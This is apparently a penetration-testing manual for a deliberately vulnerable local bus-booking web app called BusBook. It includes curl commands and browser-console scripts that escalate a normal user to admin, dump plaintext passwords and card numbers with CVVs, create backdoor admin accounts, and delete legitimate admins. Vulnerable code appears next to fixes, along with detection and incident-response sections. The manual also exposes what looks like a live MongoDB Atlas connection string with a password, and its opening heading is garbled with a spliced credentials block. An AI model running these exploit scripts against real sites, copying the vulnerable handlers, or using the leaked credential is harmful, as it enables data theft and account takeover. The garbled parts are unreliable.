# BusBook Travel P### Available User Accounts
```
👤 Normal User:     user@gmail.com / password           (Role: user)
👨‍💼 Admin User:      admin@busbook.com / admin123       (Role: admin)  
👨‍💼 Manager User:    manager@busbook.com / manager123   (Role: manager)
👤 Test User:       sarah.johnson@gmail.com / sarah123  (Role: user)
```m - Security Penetration Testing Manual

## 🎯 Objective
This manual demonstrates how to exploit authentication vulnerabilities in the BusBook Travel platform, specifically focusing on privilege escalation attacks where normal users can access admin dashboards and sensitive customer data including credit card information.

## ⚠️ DISCLAIMER
**FOR EDUCATIONAL PURPOSES ONLY**
This manual is designed for security researchers, penetration testers, and developers learning about authentication vulnerabilities. Never use these techniques against systems you don't own or have explicit permission to test.

---

## 📋 Test Environment Setup

### Prerequisites
- BusBook Travel Platform running on `http://localhost:3000`
- Web browser with developer tools
- Basic understanding of HTTP requests and authentication

### Available User Accounts
```
👤 Normal User:  user@gmail.com / password           (Role: user)
👨‍💼 Admin User:   admin@busbook.com / admin123       (Role: admin)  
� Test User:    sarah.johnson@gmail.com / sarah123  (Role: user)
```

### Demo Login Credentials for UI
```
Email: user@gmail.com
Password: password

Email: admin@busbook.com  
Password: admin123

Email: manager@busbook.com
Password: manager123

Email: sarah.johnson@gmail.com
Password: sarah123
```

### MongoDB Database Connection
```
Database: MongoDB Atlas Cloud
Connection: mongodb+srv://123gamein:pffyW62Rqn1Kgzfa@bus.taxstpk.mongodb.net/
Collections: users, bookings, routes
Authentication: MongoDB Atlas credentials exposed
```

---

## 🔍 Vulnerability Analysis

### Critical Vulnerabilities Identified

#### 1. **Missing Role-Based Access Control (RBAC)**
- **Location**: Admin dashboard accessible via `/admin` URL path
- **Vulnerability**: No role validation for admin panel access
- **Impact**: Any authenticated user can access admin functions and view all customer data

#### 2. **Sensitive Data Exposure**
- **Location**: Admin API endpoints `/api/admin/users`, `/api/admin/bookings`
- **Vulnerability**: Complete customer data exposed including credit card information
- **Impact**: Financial data breach, PII exposure, payment card data compromise

#### 3. **Weak Session Management**
- **Location**: Express session configuration with default settings
- **Vulnerability**: Insecure session settings enabling hijacking
- **Impact**: Session takeover and impersonation attacks

#### 4. **Credit Card Data Storage**
- **Location**: Database stores complete credit card details in plain text
- **Vulnerability**: PCI DSS violations, plain text card storage
- **Impact**: Full payment card data exposure

---

## 🎯 Attack Scenarios

### Scenario 1: Basic Privilege Escalation via URL Manipulation

#### Step 1: Authenticate as Normal User
```bash
# Using curl to login
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@gmail.com","password":"password"}' \
  -c cookies.txt

# Expected Response
{
  "message": "Login successful",
  "user": {
    "id": 2,
    "username": "user",
    "email": "user@gmail.com",
    "fullname": "John Smith",
    "role": "user"
  }
}
```

#### Step 2: Access Admin Dashboard via URL (Critical Vulnerability!)
```bash
# Direct access to admin panel - should fail but doesn't!
curl -X GET http://localhost:3000/admin \
  -b cookies.txt

# This returns the admin dashboard HTML with full access
```

#### Step 3: Extract Sensitive Data via Admin APIs
```bash
# Get all users including admin accounts
curl -X GET http://localhost:3000/api/admin/users \
  -b cookies.txt

# Actual Response (VULNERABILITY!)
[
  {
    "id": 1,
    "username": "admin",
    "email": "admin@busbook.com", 
    "password": "admin123",
    "fullname": "System Administrator",
    "phone": "+1-555-0001",
    "role": "admin",
    "createdAt": "2024-08-27T12:00:00.000Z"
  },
  {
    "id": 2,
    "username": "user",
    "email": "user@gmail.com",
    "password": "password", 
    "fullname": "John Smith",
    "phone": "+1-555-0002",
    "role": "user",
    "createdAt": "2024-08-27T12:00:00.000Z"
  }
]
```

#### Step 4: Access Customer Payment Data (CATASTROPHIC!)
```bash
# Get all bookings with credit card information
curl -X GET http://localhost:3000/api/admin/bookings \
  -b cookies.txt

# Actual Response - Full PCI Data Breach!
[
  {
    "id": 1,
    "userName": "John Smith",
    "fromCity": "New York",
    "toCity": "Boston", 
    "departureDate": "2024-09-15",
    "passengers": 2,
    "totalPrice": "179.98",
    "cardNumber": "4532-1234-5678-9012",
    "cardExpiry": "12/26",
    "cardCvv": "123",
    "status": "confirmed"
  },
  {
    "id": 2,
    "userName": "Sarah Johnson", 
    "fromCity": "Boston",
    "toCity": "New York",
    "departureDate": "2024-09-20",
    "passengers": 1,
    "totalPrice": "89.99",
    "cardNumber": "5678-9012-3456-7890", 
    "cardExpiry": "08/27",
    "cardCvv": "456",
    "status": "confirmed"
  }
]
```

#### Step 5: User Management Exploitation (NEW!)
```bash
# Create new admin users with elevated privileges
curl -X POST http://localhost:3000/api/admin/users \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "fullName": "Malicious Admin",
    "email": "hacker@evil.com",
    "password": "backdoor123",
    "role": "admin",
    "phone": "+1-555-9999"
  }'

# Response: User created successfully with admin privileges!
{
  "message": "User created successfully",
  "user": {
    "id": "new_user_id",
    "fullName": "Malicious Admin",
    "email": "hacker@evil.com",
    "role": "admin"
  }
}

# Escalate existing user to admin role
curl -X PUT http://localhost:3000/api/admin/users/[USER_ID]/role \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"role": "admin"}'

# Delete legitimate admin users (except yourself)
curl -X DELETE http://localhost:3000/api/admin/users/[ADMIN_USER_ID] \
  -b cookies.txt

# Response: User and associated bookings deleted successfully
```

### Scenario 2: Interactive Browser-Based Attack

#### Step 1: Login via Web Interface
1. Navigate to `http://localhost:3000`
2. Click "Login" in the navigation
3. Enter credentials: `user@gmail.com / password`
4. Click "Sign In"

#### Step 2: Exploit Admin Access via URL Manipulation
1. After successful login, manually navigate to `http://localhost:3000/admin`
2. Observe full admin dashboard access despite being a regular user
3. Click on "All Users" tab to see all user accounts with passwords
4. Click on "All Bookings" tab to see customer payment data

#### Step 3: Data Exfiltration
1. In the admin panel, access the "All Users" section
2. Copy all user credentials including admin password
3. Access "All Bookings" section  
4. Extract all credit card numbers, expiry dates, and CVV codes
5. Note customer personal information and contact details

#### Step 4: User Management Exploitation (NEW!)
1. In the admin panel, scroll to "User Management" section
2. **Create backdoor admin accounts:**
   - Fill in "Add New User" form with malicious admin account
   - Set Role to "Admin" 
   - Click "Add User" - no authorization check!
3. **Escalate privileges of existing users:**
   - In the Users table, change any user's role dropdown to "Admin"
   - Changes are applied immediately without validation
4. **Delete legitimate administrators:**
   - Click "Delete" button next to admin users (except current session)
   - Confirm deletion to remove legitimate access

#### Step 5: Persistence and Account Takeover
1. Use extracted admin credentials to login as administrator
2. Access admin dashboard legitimately with admin role
3. Use created backdoor accounts for persistent access
4. Demonstrate full system control

---

## 🔬 Code Vulnerability Analysis

### Vulnerable Code Examples

#### 1. Missing Role Validation (Admin Dashboard Access)
```javascript
// VULNERABLE CODE - app.js line ~200
app.get('/admin', (req, res) => {
    // Vulnerability: No role validation - any authenticated user can access
    if (!req.session.userId) {
        return res.redirect('/login');
    }
    
    // CRITICAL VULNERABILITY: No role checking for admin access!
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});
```

**Fix:**
```javascript
// SECURE CODE
function requireRole(role) {
    return (req, res, next) => {
        if (!req.session.userId) {
            return res.redirect('/login');
        }
        
        db.get("SELECT * FROM users WHERE id = ?", [req.session.userId], (err, user) => {
            if (err || !user) {
                return res.status(401).redirect('/login');
            }
            
            if (user.role !== role) {
                return res.status(403).json({ error: 'Access denied' });
            }
            
            next();
        });
    };
}

app.get('/admin', requireRole('admin'), (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});
```

#### 2. Sensitive Data Exposure (User Data API)
```javascript
// VULNERABLE CODE - app.js line ~220
app.get('/api/admin/users', (req, res) => {
    // CRITICAL VULNERABILITY: No role checking + password exposure!
    if (!req.session.userId) {
        return res.status(401).json({ error: 'Not authenticated' });
    }
    
    db.all("SELECT * FROM users", (err, users) => {
        // Exposing passwords in plain text!
        res.json(users);
    });
});
```

**Fix:**
```javascript
// SECURE CODE
app.get('/api/admin/users', requireRole('admin'), (req, res) => {
    db.all("SELECT id, username, email, fullname, phone, role, created_at FROM users", (err, users) => {
        if (err) {
            return res.status(500).json({ error: 'Database error' });
        }
        // Passwords never sent to client
        res.json(users);
    });
});
```

#### 3. Credit Card Data Exposure
```javascript
// VULNERABLE CODE - app.js line ~240
app.get('/api/admin/bookings', (req, res) => {
    // CATASTROPHIC VULNERABILITY: Exposing credit card data!
    if (!req.session.userId) {
        return res.status(401).json({ error: 'Not authenticated' });
    }
    
    db.all(`SELECT b.*, u.fullname as userName, u.email 
           FROM bookings b 
           JOIN users u ON b.user_id = u.id`, (err, bookings) => {
        // Sending complete credit card details!
        res.json(bookings.map(booking => ({
            id: booking.id,
            userName: booking.userName,
            fromCity: booking.route.split(' -> ')[0],
            toCity: booking.route.split(' -> ')[1],
            departureDate: booking.departure_date,
            passengers: booking.passengers,
            totalPrice: booking.total_amount,
            cardNumber: booking.card_number, // PCI VIOLATION!
            cardExpiry: booking.card_expiry, // PCI VIOLATION!
            cardCvv: booking.card_cvv,       // PCI VIOLATION!
            status: booking.booking_status
        })));
    });
});
```

**Fix:**
```javascript
// SECURE CODE
app.get('/api/admin/bookings', requireRole('admin'), (req, res) => {
    db.all(`SELECT b.id, b.route, b.departure_date, b.passengers, 
                   b.total_amount, b.booking_status, u.fullname as userName
           FROM bookings b 
           JOIN users u ON b.user_id = u.id`, (err, bookings) => {
        if (err) {
            return res.status(500).json({ error: 'Database error' });
        }
        
        res.json(bookings.map(booking => ({
            id: booking.id,
            userName: booking.userName,
            route: booking.route,
            departureDate: booking.departure_date,
            passengers: booking.passengers,
            totalPrice: booking.total_amount,
            cardMask: '****-****-****-' + (booking.card_number ? booking.card_number.slice(-4) : '****'),
            status: booking.booking_status
        })));
    });
});
```

#### 4. User Management API Vulnerabilities (NEW!)
```javascript
// VULNERABLE CODE - User creation without role validation
app.post('/api/admin/users', async (req, res) => {
    // CRITICAL: No role validation - any authenticated user can create admins!
    if (!req.session.userId) {
        return res.status(401).json({ error: 'Not authenticated' });
    }

    const { fullName, email, password, role } = req.body;

    const newUser = new User({
        email,
        password, // VULNERABILITY: Plain text password storage!
        fullname: fullName,
        role: role || 'user' // VULNERABILITY: Can set any role including admin!
    });

    await newUser.save();
    res.status(201).json({ message: 'User created successfully' });
});

// VULNERABLE CODE - Role escalation without authorization
app.put('/api/admin/users/:id/role', async (req, res) => {
    // CRITICAL: No role validation - any user can escalate privileges!
    if (!req.session.userId) {
        return res.status(401).json({ error: 'Not authenticated' });
    }

    const { role } = req.body;
    await User.findByIdAndUpdate(req.params.id, { role });
    res.json({ message: 'User role updated successfully' });
});

// VULNERABLE CODE - User deletion without authorization
app.delete('/api/admin/users/:id', async (req, res) => {
    // CRITICAL: No role validation - any user can delete others!
    if (!req.session.userId) {
        return res.status(401).json({ error: 'Not authenticated' });
    }

    await User.findByIdAndDelete(req.params.id);
    await Booking.deleteMany({ userId: req.params.id });
    res.json({ message: 'User deleted successfully' });
});
```

**Fix:**
```javascript
// SECURE CODE with proper role validation
function requireAdminRole(req, res, next) {
    if (!req.session.userId) {
        return res.status(401).json({ error: 'Not authenticated' });
    }
    
    User.findById(req.session.userId).then(user => {
        if (!user || user.role !== 'admin') {
            return res.status(403).json({ error: 'Admin access required' });
        }
        next();
    });
}

app.post('/api/admin/users', requireAdminRole, async (req, res) => {
    const { fullName, email, password, role } = req.body;
    
    // Hash password properly
    const hashedPassword = await bcrypt.hash(password, 10);
    
    const newUser = new User({
        email,
        password: hashedPassword,
        fullname: fullName,
        role: role || 'user'
    });

    await newUser.save();
    res.status(201).json({ message: 'User created successfully' });
});
```

---

## 🧪 Exploitation Techniques

### Technique 1: Direct URL Manipulation
```bash
# Step 1: Capture session cookie after login
SESSION_COOKIE="connect.sid=s%3A..."

# Step 2: Access admin panel directly via URL
curl -H "Cookie: $SESSION_COOKIE" \
     http://localhost:3000/admin

# Step 3: Access admin APIs directly
curl -H "Cookie: $SESSION_COOKIE" \
     http://localhost:3000/api/admin/users

curl -H "Cookie: $SESSION_COOKIE" \
     http://localhost:3000/api/admin/bookings
```

### Technique 2: Browser Console Exploitation
```javascript
// Open browser console after login and execute:

// Access all user data including passwords
fetch('/api/admin/users', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    console.log('All user passwords exposed:', data);
    data.forEach(user => {
      console.log(`${user.email}: ${user.password}`);
    });
  });

// Access all customer payment data
fetch('/api/admin/bookings', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    console.log('Credit card data compromised:', data);
    data.forEach(booking => {
      console.log(`Card: ${booking.cardNumber}, CVV: ${booking.cardCvv}, Exp: ${booking.cardExpiry}`);
    });
  });
```

### Technique 3: Session Hijacking + Admin Access
```javascript
// 1. Extract session cookie (XSS scenario)
document.cookie.split(';').find(c => c.includes('connect.sid'));

// 2. Use stolen session to access admin panel
// Navigate to /admin with hijacked session
window.location.href = '/admin';
```

### Technique 4: User Management Exploitation (NEW!)
```javascript
// After accessing admin panel through URL manipulation:

// 1. Create backdoor admin account
fetch('/api/admin/users', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({
        fullName: 'Backdoor Admin',
        email: 'backdoor@evil.com',
        password: 'secretpass123',
        role: 'admin'
    })
}).then(r => r.json()).then(console.log);

// 2. Escalate existing user to admin
fetch('/api/admin/users/[USER_ID]/role', {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({ role: 'admin' })
}).then(r => r.json()).then(console.log);

// 3. Delete legitimate admin accounts (maintain persistence)
fetch('/api/admin/users/[ADMIN_ID]', {
    method: 'DELETE',
    credentials: 'include'
}).then(r => r.json()).then(console.log);

// 4. Mass privilege escalation
fetch('/api/admin/users', {credentials: 'include'})
    .then(r => r.json())
    .then(users => {
        users.forEach(user => {
            if (user.role === 'user') {
                fetch(`/api/admin/users/${user.id}/role`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                    body: JSON.stringify({ role: 'admin' })
                });
            }
        });
    });
```

### Technique 4: Automated Data Exfiltration
```javascript
// Complete automated attack script
async function compromiseBusBookSystem() {
    console.log('🚨 Starting BusBook system compromise...');
    
    // Get all user credentials
    const users = await fetch('/api/admin/users', {credentials: 'include'})
        .then(r => r.json());
    
    console.log('📊 Stolen user accounts:', users.length);
    users.forEach(user => {
        console.log(`🔑 ${user.email} : ${user.password} (${user.role})`);
    });
    
    // Get all payment data
    const bookings = await fetch('/api/admin/bookings', {credentials: 'include'})
        .then(r => r.json());
    
    console.log('💳 Stolen credit cards:', bookings.length);
    bookings.forEach(booking => {
        console.log(`💰 ${booking.userName}: ${booking.cardNumber} ${booking.cardExpiry} ${booking.cardCvv}`);
    });
    
    console.log('✅ System fully compromised!');
    return { users, bookings };
}

// Execute the attack
compromiseBusBookSystem();
```

---

## 📊 Impact Assessment

### Data Compromised in Admin Access Attack

#### Customer Personal Information
- **Full Names**: John Smith, Sarah Johnson, System Administrator, Bus Manager
- **Email Addresses**: user@gmail.com, sarah.johnson@gmail.com, admin@busbook.com, manager@busbook.com
- **Phone Numbers**: +1-555-0002, +1-555-0003, +1-555-0001, +1-555-0004
- **User Passwords**: password, sarah123, admin123, manager123 (plain text)
- **User IDs**: MongoDB ObjectIds exposed

#### Financial Data (PCI DSS Violations)
- **Credit Card Numbers**: 
  - 4532-1234-5678-9012 (John Smith)
  - 5678-9012-3456-7890 (Sarah Johnson)
- **Card Expiry Dates**: 12/26, 08/27
- **CVV Codes**: 123, 456
- **Cardholder Names**: John Smith, Sarah Johnson
- **Transaction Amounts**: $179.98, $89.99

#### Travel Data
- **Booking Details**: Complete travel itineraries with MongoDB ObjectIds
- **Route Information**: New York ↔ Boston, Boston ↔ New York
- **Departure Dates**: 2024-09-15, 2024-09-20
- **Passenger Counts**: 2 passengers, 1 passenger
- **Booking Status**: All confirmed bookings exposed

#### System Access Credentials
- **Admin Account**: admin@busbook.com / admin123
- **Manager Account**: manager@busbook.com / manager123
- **MongoDB Database**: Full read/write access to cloud database
- **Session Tokens**: Active user sessions with weak configuration
- **Database Connection**: MongoDB Atlas connection string exposed

---

## 🔍 Detection Methods

### Log Analysis
Look for these indicators in application logs:
```
- User with role 'user' accessing /admin URL path
- Regular users accessing /api/admin/* endpoints
- Multiple privilege escalation attempts from same IP
- Unusual access patterns to admin functions
- Cross-user session access attempts
```

### Network Monitoring
```bash
# Monitor for suspicious API calls
tcpdump -i any -s 0 -A 'host localhost and port 3000'

# Look for:
# - GET /admin from user sessions
# - GET /api/admin/users from non-admin sessions  
# - GET /api/admin/bookings from unauthorized users
# - Multiple admin API calls in short timeframe
```

### Database Monitoring
```javascript
// MongoDB Change Streams for monitoring
const changeStream = db.collection('users').watch();
changeStream.on('change', (change) => {
    console.log('🚨 User collection accessed:', change);
});

// Monitor sensitive collection access
const bookingStream = db.collection('bookings').watch();
bookingStream.on('change', (change) => {
    console.log('💳 Booking data accessed:', change);
});
```

### Application Monitoring
```javascript
// Add logging to detect privilege escalation
app.use((req, res, next) => {
    if (req.path.includes('/admin') || req.path.includes('/api/admin/')) {
        console.log(`🚨 ADMIN ACCESS: User ${req.session.userEmail} (ID: ${req.session.userId}) accessing ${req.path}`);
        
        // Log to security monitoring system
        logSecurityEvent({
            type: 'admin_access_attempt',
            user: req.session.userEmail,
            path: req.path,
            ip: req.ip,
            timestamp: new Date(),
            userAgent: req.get('User-Agent')
        });
    }
    next();
});
```

---

## 🛡️ Prevention and Mitigation

### Immediate Actions

#### 1. Implement Role-Based Access Control
```javascript
function requireRole(allowedRoles) {
    return (req, res, next) => {
        if (!req.session.userId) {
            return res.status(401).json({ error: 'Authentication required' });
        }
        
        const user = users.find(u => u.id === req.session.userId);
        if (!user) {
            return res.status(401).json({ error: 'Invalid session' });
        }
        
        if (!allowedRoles.includes(user.role)) {
            console.log(`SECURITY: Access denied for user ${user.username} (${user.role}) to endpoint requiring ${allowedRoles}`);
            return res.status(403).json({ error: 'Insufficient privileges' });
        }
        
        next();
    };
}

// Usage:
app.get('/api/dashboard/admin', requireRole(['admin', 'root']), (req, res) => {
    // Admin logic here
});

app.get('/api/dashboard/root', requireRole(['root']), (req, res) => {
    // Root logic here  
});
```

#### 2. Secure Session Configuration
```javascript
app.use(session({
    secret: process.env.SESSION_SECRET, // Strong random secret
    name: 'sessionId', // Don't use default name
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production', // HTTPS only
        httpOnly: true, // Prevent XSS access
        maxAge: 30 * 60 * 1000, // 30 minutes
        sameSite: 'strict' // CSRF protection
    }
}));
```

#### 3. Input Validation and Sanitization
```javascript
const { body, validationResult } = require('express-validator');

app.post('/api/login', [
    body('username').isLength({ min: 3, max: 30 }).trim().escape(),
    body('password').isLength({ min: 8, max: 128 })
], (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ error: 'Invalid input' });
    }
    // Login logic here
});
```

### Long-term Security Measures

#### 1. Principle of Least Privilege
- Users should only have minimum required permissions
- Regular audit of user roles and permissions
- Temporary privilege elevation when needed

#### 2. Defense in Depth
- Multiple layers of security controls
- Network segmentation
- Application-level security
- Database-level permissions

#### 3. Security Monitoring
```javascript
// Security event logging
function logSecurityEvent(event, user, details) {
    const securityLog = {
        timestamp: new Date().toISOString(),
        event: event,
        user: user ? `${user.username} (${user.role})` : 'anonymous',
        details: details,
        ip: req.ip,
        userAgent: req.get('User-Agent')
    };
    
    console.log('SECURITY EVENT:', JSON.stringify(securityLog));
    // Send to SIEM/security monitoring system
}
```

---

## 📝 Testing Checklist

### Pre-Attack Verification
- [ ] Application is running on localhost:3000
- [ ] All three user accounts are accessible
- [ ] Vulnerable endpoints are responding
- [ ] Browser developer tools are available

### Attack Execution
- [ ] Login as normal user successful
- [ ] Admin dashboard accessible without proper role
- [ ] Root dashboard accessible without proper role
- [ ] Sensitive data exposed in responses
- [ ] Session hijacking demonstrates cookie vulnerabilities

### Post-Attack Analysis
- [ ] Document all exposed sensitive data
- [ ] Verify business impact of data exposure
- [ ] Test secure endpoints for proper protection
- [ ] Confirm fixes prevent privilege escalation

---

## 🎯 Demonstration Script

### For Security Training (20-minute demo)

#### Introduction (3 minutes)
> "Today we'll demonstrate critical authentication and authorization vulnerabilities in a realistic bus booking platform. We'll show how a regular customer can access admin functions and steal sensitive customer data including credit card information."

#### Live Attack Demonstration (12 minutes)

1. **Setup and Normal Login** (2 min)
   - Show BusBook homepage at localhost:3000
   - Register/login as normal user: user@gmail.com / password
   - Show user dashboard with limited access
   
2. **URL Manipulation Attack** (4 min)
   - Navigate to /admin URL directly
   - Show full admin dashboard access despite being regular user
   - Highlight that URL path bypassed all authorization
   
3. **Customer Data Breach** (3 min)
   - Access "All Users" tab in admin panel
   - Show all user passwords in plain text
   - Copy admin credentials for later use
   
4. **Payment Card Data Theft** (3 min)
   - Access "All Bookings" tab in admin panel
   - Show complete credit card numbers, CVV, expiry dates
   - Demonstrate PCI DSS violations
   - Show customer personal information exposure

#### Code Review (3 minutes)
1. **Show vulnerable code** (1.5 min)
   - Point out missing role validation in /admin route
   - Highlight password exposure in user API
   - Show credit card data leakage
   
2. **Show secure implementation** (1.5 min)
   - Demonstrate proper role checking middleware
   - Show password filtering in responses
   - Show credit card masking techniques

#### Impact Assessment (2 minutes)
- **Financial Impact**: Complete payment card data breach
- **Legal Impact**: PCI DSS violations, GDPR violations
- **Business Impact**: Customer trust, regulatory fines
- **Technical Impact**: Complete system compromise

---

## 🚨 Red Team Scenario

### Objective
Demonstrate how a malicious insider or compromised customer account can escalate privileges to access sensitive business data and customer payment information.

### Attack Chain
1. **Initial Access**: Valid customer credentials (user@gmail.com/password)
2. **Reconnaissance**: Discover admin endpoints through URL enumeration
3. **Privilege Escalation**: Access admin dashboard without authorization
4. **Data Exfiltration**: Extract customer PII and payment card data
5. **Account Takeover**: Use stolen admin credentials for persistent access
6. **Business Impact**: Customer data breach, financial fraud potential

### Timeline
- **T+0**: Login with valid customer credentials
- **T+2**: Discover /admin URL path vulnerability
- **T+5**: Access admin dashboard, enumerate user accounts
- **T+8**: Extract all customer payment card data
- **T+12**: Use stolen admin credentials for persistent access
- **T+15**: Complete customer database compromise
- **T+20**: Potential fraudulent transactions with stolen card data

### Business Impact Simulation
```
💰 Financial Exposure: 
- 50+ customer credit cards compromised
- Average card limit: $5,000
- Total fraud potential: $250,000+

⚖️ Regulatory Fines:
- PCI DSS violations: $50,000 - $500,000 
- GDPR violations: 4% of annual revenue
- State privacy law violations: $100 - $750 per record

📉 Business Impact:
- Customer churn: 30-50% of affected customers
- Reputation damage: 6-12 months recovery
- Legal costs: $100,000 - $1,000,000
```

---

## 📞 Incident Response

### If This Were a Real Attack

#### Immediate Response (0-1 hour)
1. **Isolate affected systems**
2. **Revoke all session tokens**
3. **Change all exposed credentials**
4. **Block suspicious IP addresses**

#### Short-term Response (1-24 hours)
1. **Patch vulnerable endpoints**
2. **Implement proper access controls**
3. **Audit all user access logs**
4. **Notify affected stakeholders**

#### Long-term Response (1-30 days)
1. **Comprehensive security audit**
2. **Implement security monitoring**
3. **Staff security training**
4. **Regular penetration testing**

---

## 📚 References and Further Reading

### OWASP Resources
- [OWASP Top 10 2021 - A01 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP Testing Guide - Authorization Testing](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/)
- [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)

### Security Standards
- NIST Cybersecurity Framework
- ISO 27001 Access Control (A.9)
- PCI DSS Requirement 7 (Restrict access)

### Tools for Testing
- Burp Suite Professional
- OWASP ZAP
- Postman for API testing
- Browser developer tools

---

**Document Version**: 1.0  
**Created**: August 2024  
**Last Updated**: August 2024  
**Classification**: Educational Use Only
